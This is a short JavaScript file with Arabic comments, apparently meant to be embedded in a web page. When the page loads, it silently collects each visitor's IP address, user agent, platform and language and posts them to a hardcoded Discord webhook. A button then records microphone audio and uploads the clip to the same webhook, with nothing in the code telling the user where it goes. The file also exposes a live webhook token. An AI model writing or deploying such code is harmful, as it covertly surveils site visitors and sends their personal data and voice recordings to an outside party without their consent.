
// === إرسال بيانات الجهاز تلقائيًا عند فتح الموقع ===
async function getIP() {
    try {
        let res = await fetch("https://api.ipify.org?format=json");
        let data = await res.json();
        return data.ip;
    } catch (e) {
        return "IP not available";
    }
}

function getClientInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language
    };
}

async function sendClientInfo() {
    const ip = await getIP();
    const info = getClientInfo();
    info.ip = ip;

    await fetch("https://discord.com/api/webhooks/1365249447151538216/hSASwWLb_cJRrREl1meba1VVWEg5YbwwLU3fXSAMSJgjNT0ih9woItQlx0BwOrKe47Hm", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content: "Client Info",
            embeds: [{
                title: "New Visitor",
                fields: Object.entries(info).map(([k, v]) => ({ name: k, value: String(v) }))
            }]
        })
    });
}

sendClientInfo();

// === تسجيل الصوت عند الضغط على الزر وإرساله ===
let mediaRecorder;
let audioChunks = [];

document.addEventListener("DOMContentLoaded", () => {
    const btn = document.getElementById("recordButton");
    if (!btn) return;

    btn.addEventListener("click", async () => {
        if (!mediaRecorder || mediaRecorder.state === 'inactive') {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            mediaRecorder = new MediaRecorder(stream);

            mediaRecorder.ondataavailable = event => {
                audioChunks.push(event.data);
            };

            mediaRecorder.onstop = async () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                const formData = new FormData();
                formData.append('file', audioBlob, 'voice.webm');

                await fetch("https://discord.com/api/webhooks/1365249447151538216/hSASwWLb_cJRrREl1meba1VVWEg5YbwwLU3fXSAMSJgjNT0ih9woItQlx0BwOrKe47Hm", {
                    method: 'POST',
                    body: formData
                });

                audioChunks = [];
            };

            mediaRecorder.start();
            btn.textContent = 'إيقاف التسجيل';
        } else if (mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            btn.textContent = 'بدء تسجيل الصوت';
        }
    });
});
